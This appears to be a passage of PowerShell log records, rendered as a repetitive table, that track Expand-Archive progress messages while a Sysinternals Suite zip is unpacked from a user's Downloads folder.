ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;306&quot;
 
-RECORD 7-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;99&quot;
                                                                                                                                                                                                                                                                 
-RECORD 8-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;305&quot;
 
-RECORD 9-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;99&quot;
                                                                                                                                                                                                                                                                 
-RECORD 10----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;304&quot;
 
-RECORD 11----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;99&quot;
                                                                                                                                                                                                                                                                 
-RECORD 12----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;303&quot;
 
-RECORD 13----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;98&quot;
                                                                                                                                                                                                                                                                 
-RECORD 14----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;302&quot;
 
-RECORD 15----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;98&quot;
                                                                                                                                                                                                                                                                 
-RECORD 16----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;301&quot;
 
-RECORD 17----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;98&quot;
                                                                                                                                                                                                                                                                 
-RECORD 18----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;300&quot;
 
-RECORD 19----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;97&quot;
                                                                                                                                                                                                                                                                 
-RECORD 20----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;299&quot;
 
-RECORD 21----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;97&quot;
                                                                                                                                                                                                                                                                 
-RECORD 22----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;298&quot;
 
-RECORD 23----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;97&quot;
                                                                                                                                                                                                                                                                 
-RECORD 24----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;297&quot;
 
-RECORD 25----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;96&quot;
                                                                                                                                                                                                                                                                 
-RECORD 26----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;296&quot;
 
-RECORD 27----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;96&quot;
                                                                                                                                                                                                                                                                 
-RECORD 28----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;295&quot;
 
-RECORD 29----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;96&quot;
                                                                                                                                                                                                                                                                 
-RECORD 30----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;294&quot;
 
-RECORD 31----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;95&quot;
                                                                                                                                                                                                                                                                 
-RECORD 32----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;293&quot;
 
-RECORD 33----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;95&quot;
                                                                                                                                                                                                                                                                 
-RECORD 34----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;292&quot;
 
-RECORD 35----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;95&quot;
                                                                                                                                                                                                                                                                 
-RECORD 36----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;291&quot;
 
-RECORD 37----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;94&quot;
                                                                                                                                                                                                                                                                 
-RECORD 38----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;290&quot;
 
-RECORD 39----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;94&quot;
                                                                                                                                                                                                                                                                 
-RECORD 40----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
ParameterBinding(ProgressBarHelper): name=&quot;cmdletName&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(ProgressBarHelper): name=&quot;status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(ProgressBarHelper): name=&quot;previousSegmentWeight&quot;; value=&quot;0&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentSegmentWeight&quot;; value=&quot;100&quot;
ParameterBinding(ProgressBarHelper): name=&quot;totalNumberofEntries&quot;; value=&quot;308&quot;
ParameterBinding(ProgressBarHelper): name=&quot;currentEntryCount&quot;; value=&quot;289&quot;
 
-RECORD 41----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(Write-Progress): &quot;Write-Progress&quot;
ParameterBinding(Write-Progress): name=&quot;Activity&quot;; value=&quot;Expand-Archive&quot;
ParameterBinding(Write-Progress): name=&quot;Status&quot;; value=&quot;The archive file &#39;C:\Users\pbeesly\Downloads\SysinternalsSuite.zip&#39; expansion is in progress...&quot;
ParameterBinding(Write-Progress): name=&quot;PercentComplete&quot;; value=&quot;94&quot;
                                                                                                                                                                                                                                                                 
-RECORD 42----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Payload | CommandInvocation(ProgressBarHelper): &quot;ProgressBarHelper&quot;
